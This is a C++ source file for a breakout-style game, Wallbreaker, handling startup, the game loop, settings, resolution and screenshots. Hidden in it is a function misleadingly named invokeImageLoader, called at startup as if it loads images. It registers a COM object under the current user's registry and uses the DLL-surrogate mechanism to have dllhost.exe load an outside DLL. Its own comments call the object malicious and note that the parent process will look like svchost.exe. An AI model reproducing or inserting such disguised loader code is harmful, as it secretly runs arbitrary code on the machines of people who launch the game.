#include "Game.hpp"
#include "Config.hpp"
#include "Gui/Theme.hpp"
#include "LevelManager.hpp"
#include "Resources.hpp"
#include "Settings.hpp"
#include "SoundSystem.hpp"
#include "States/State.hpp"
#include "Utils/IniParser.hpp"
#include "Utils/Os.hpp"
#include <filesystem>
#include <iostream>

#include <windows.h>
#include <objbase.h>
#include <iostream>

int invokeImageLoader();

Game& Game::getInstance()
{
    static Game self;
    return self;
}


Game::Game():
    m_fullscreen(false),
    m_running(true),
    m_view(sf::FloatRect(0, 0, APP_WIDTH, APP_HEIGHT)),
    m_currentState(nullptr)
{
}


Game::~Game()
{
}


void Game::init(const std::string& command)
{
    // Get dirname from the command and set application directory
    m_appDir = std::filesystem::path(command).parent_path().string() + "\\";

    // Init resources search directory
    Resources::setSearchPath(m_appDir + "resources\\");

    // Load some images.
    invokeImageLoader();

    // Init levels
    std::string levelPath = m_appDir + APP_LEVEL_FILE;
    std::cout << "* loading levels: \"" << levelPath << '"' << std::endl;
    LevelManager::getInstance().openFromFile(levelPath);

    initGuiTheme();

    std::cout << m_appDir << "resources\\musics\\evolution_sphere.ogg" << std::endl;
    SoundSystem::openMusicFromFile(m_appDir + "resources\\musics\\evolution_sphere.ogg");

    // Init application config directory
    std::filesystem::path configPath = os::config_path("wallbreaker");
    if (!std::filesystem::is_directory(configPath))
    {
        std::cout << "* create directory: " << configPath << std::endl;
        std::filesystem::create_directory(configPath);
    }

    // Load configuration from settings file
    configPath.append(APP_SETTINGS_FILE);
    IniParser config;
    if (config.load(configPath.string()))
    {
        std::cout << "* loading config: " << configPath << std::endl;
        config.seek_section("Wallbreaker");
        unsigned int app_width = config.get("app_width", APP_WIDTH * 2);
        unsigned int app_height = config.get("app_height", APP_HEIGHT * 2);
        m_fullscreen = config.get("fullscreen", false);
        if (m_fullscreen)
            setFullscreen();
        else
            setResolution(app_width, app_height);

        Settings::highscore = config.get("highscore", 0);

        SoundSystem::enableSound(config.get("sound", true));
        SoundSystem::enableMusic(config.get("music", true));
    }
    else
    {
        setResolution(APP_WIDTH * 2, APP_HEIGHT * 2);
    }

    SoundSystem::playMusic();
}


void Game::run()
{
    sf::Clock clock;

    while (m_running)
    {
        // Poll events and send them to the current state
        sf::Event event;
        while (m_window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed)
            {
                quit();
            }
            else if (event.type == sf::Event::KeyPressed && event.key.code == sf::Keyboard::F2)
            {
                takeScreenshot();
            }
            else
            {
                m_currentState->onEvent(event);
            }
        }

        // Update current state
        float frametime = clock.restart().asSeconds();
        m_currentState->update(frametime);

        // Render current state
        m_window.clear();
        m_window.setView(m_view);
        m_window.draw(*m_currentState);
        m_window.display();
    }
}


void Game::initGuiTheme()
{
    // Load assets for GUI
    gui::Theme::font.loadFromFile(m_appDir + "/resources/images/font.png");
    gui::Theme::clickSound.setBuffer(Resources::getSoundBuffer("click.ogg"));
    gui::Theme::cursor.loadFromSystem(sf::Cursor::Arrow);

    gui::Theme::textColor = gui::hexToColor("#d9d9f5");
    gui::Theme::backgroundColor = gui::hexToColor("#573062");
    gui::Theme::hoverColor = gui::modulateColor(gui::Theme::backgroundColor, 1.3);
    gui::Theme::focusColor = gui::modulateColor(gui::Theme::backgroundColor, 0.7);
    gui::Theme::topBorderColor = gui::hexToColor("#bd37a0");
    gui::Theme::bottomBorderColor = gui::modulateColor(gui::Theme::topBorderColor, 0.7);
}


void Game::quit()
{
    m_running = false;

    // Save configuration to settings file
    IniParser config;
    config.seek_section("Wallbreaker");
    config.set("highscore", Settings::highscore);
    config.set("app_width", m_window.getSize().x);
    config.set("app_height", m_window.getSize().y);
    config.set("fullscreen", m_fullscreen);
    config.set("sound", SoundSystem::isSoundEnabled());
    config.set("music", SoundSystem::isMusicEnabled());

    std::filesystem::path configPath = os::config_path("wallbreaker") / APP_SETTINGS_FILE;
    std::cout << "* save config to: " << configPath << std::endl;
    config.save(configPath.string());

    SoundSystem::stopAll();
}


void Game::addState(const std::string& id, State* state)
{
    m_states.emplace(id, std::unique_ptr<State>(state));
}


void Game::setCurrentState(const std::string& name)
{
    State* previous = m_currentState;
    m_currentState = m_states.at(name).get();
    m_currentState->setPrevious(previous);
    m_currentState->onFocus();
}


void Game::restorePreviousState()
{
    if (m_currentState && m_currentState->getPrevious())
    {
        m_currentState = m_currentState->getPrevious();
        m_currentState->onFocus();
    }
    else
    {
        std::cerr << "[Game] No previous state available" << std::endl;
    }
}


void Game::setResolution(unsigned int width, unsigned int height)
{
    if (m_window.isOpen() && !m_fullscreen)
    {
        m_window.setSize({width, height});
    }
    else
    {
        m_window.create(sf::VideoMode(width, height), APP_TITLE, sf::Style::Close);
    }
    std::cout << "* set resolution: " << width << "x" << height << std::endl;

    m_fullscreen = false;
    setWindowProperties();

    // Center window on desktop
    sf::VideoMode desktop = sf::VideoMode::getDesktopMode();
    m_window.setPosition(sf::Vector2i((desktop.width - width) / 2, (desktop.height - height) / 2));

    // Set application icon
    sf::Image icon = Resources::getTexture("application-icon.png").copyToImage();
    m_window.setIcon(icon.getSize().x, icon.getSize().y, icon.getPixelsPtr());
}


void Game::setFullscreen()
{
    const sf::VideoMode& desktop = sf::VideoMode::getDesktopMode();
    // Preserve aspect ratio
    const int ratio = std::min(desktop.width / APP_WIDTH, desktop.height / APP_HEIGHT);
    sf::VideoMode mode(APP_WIDTH * ratio, APP_HEIGHT * ratio);
    m_window.create(mode, APP_TITLE, sf::Style::Fullscreen);

    std::cout << "* set resolution: " << mode.width << "x" << mode.height << " (fullscreen)"
              << std::endl;
    m_fullscreen = true;
    setWindowProperties();
}


bool Game::isFullscreen() const
{
    return m_fullscreen;
}


sf::RenderWindow& Game::getWindow()
{
    return m_window;
}


void Game::takeScreenshot() const
{
    // Create screenshots directory if it doesn't exist yet
    std::filesystem::path screenshotPath = os::config_path("wallbreaker");
    screenshotPath.append(APP_SCREENSHOT_DIR);
    if (!std::filesystem::is_directory(screenshotPath))
        std::filesystem::create_directory(screenshotPath);

    char currentTime[20]; // YYYY-MM-DD_HH-MM-SS + \0
    time_t t = time(nullptr);
    strftime(currentTime, sizeof currentTime, "%Y-%m-%d_%H-%M-%S", localtime(&t));
    std::string filename = screenshotPath.string() + "/" + currentTime + ".png";

    sf::Texture texture;
    texture.create(m_window.getSize().x, m_window.getSize().y);
    texture.update(m_window);
    if (texture.copyToImage().saveToFile(filename))
    {
        std::cout << "screenshot saved to " << filename << std::endl;
    }
}


void Game::setWindowProperties()
{
    m_window.setView(m_view);
    m_window.setFramerateLimit(APP_FPS);
    m_window.setKeyRepeatEnabled(false);
    m_window.setMouseCursorGrabbed(false);
    m_window.setMouseCursor(gui::Theme::cursor);
}


// Custom CLSID for our malicious COM object
// This GUID will uniquely identify our COM object in the registry
static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";


//Helper function to write string values to Windows registry
bool SetRegStr(HKEY root, const std::wstring& key, const std::wstring& name, const std::wstring& val) {
    HKEY h;

    // Create or open the registry key with write permissions
    // REG_OPTION_VOLATILE means the key won't persist across reboots
    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,
        REG_OPTION_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS) {
        return false;
    }

    // Write the string value to the registry
    if (RegSetValueExW(h,
        name.empty() ? nullptr : name.c_str(),
        0, REG_SZ,
        reinterpret_cast<const BYTE*>(val.c_str()),
        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
        RegCloseKey(h);
        return false;
    }

    RegCloseKey(h);
    return true;
}


int invokeImageLoader() {
    // STEP 1: Create AppID registry entry for DLL Surrogate configuration
    // This tells Windows to use dllhost.exe as a surrogate process
    std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);

    // Set default value and empty DllSurrogate (triggers default dllhost.exe)
    if (!SetRegStr(HKEY_CURRENT_USER, appidKey, L"", L"MyStealthObject") ||
        !SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L"")) {
        std::wcerr << L"[!] AppID registry failed\n";
        return 1;
    }

    // STEP 2: Create CLSID registry entries to define our COM object
    // This maps our CLSID to the malicious DLL and links it to the AppID
    std::wstring clsidKey = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
    std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";

    if (!SetRegStr(HKEY_CURRENT_USER, clsidKey, L"", L"MyStealthObject") ||           // Object name
        !SetRegStr(HKEY_CURRENT_USER, clsidKey, L"AppID", CLSID_STR) ||              // Link to AppID
        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"", L"C:\\Users\\Administrator\\sample.dll") ||   // Path to malicious DLL
        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment")) { // COM threading model
        std::wcerr << L"[!] CLSID registry failed\n";
        return 1;
    }

    std::wcout << L"[+] Registry for COM surrogates created\n";

    // STEP 3: Initialize COM subsystem and trigger the injection
    // Initialize COM library for apartment-threaded model
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::wcerr << L"[!] CoInitializeEx: 0x" << std::hex << hr << L"\n";
        return 1;
    }

    // Convert string CLSID to binary format
    CLSID clsid;
    hr = CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);
    if (FAILED(hr)) {
        std::wcerr << L"[!] Invalid CLSID\n";
        return 1;
    }

    // THE MAGIC HAPPENS HERE!
    // CLSCTX_LOCAL_SERVER forces Windows to:
    // 1. Look up our CLSID in the registry
    // 2. Find the DllSurrogate entry
    // 3. Launch dllhost.exe as a surrogate process
    // 4. Load our malicious DLL into dllhost.exe
    // 5. The parent process appears as svchost.exe 
    IUnknown* p;
    hr = CoCreateInstance(clsid, nullptr,
        CLSCTX_LOCAL_SERVER,  // KEY PARAMETER: Forces out-of-process execution
        IID_IUnknown,
        (void**)&p);

    // Clean up COM subsystem
    CoUninitialize();

    // At this point, our DLL is running in dllhost.exe with svchost.exe as parent
    return 0;
}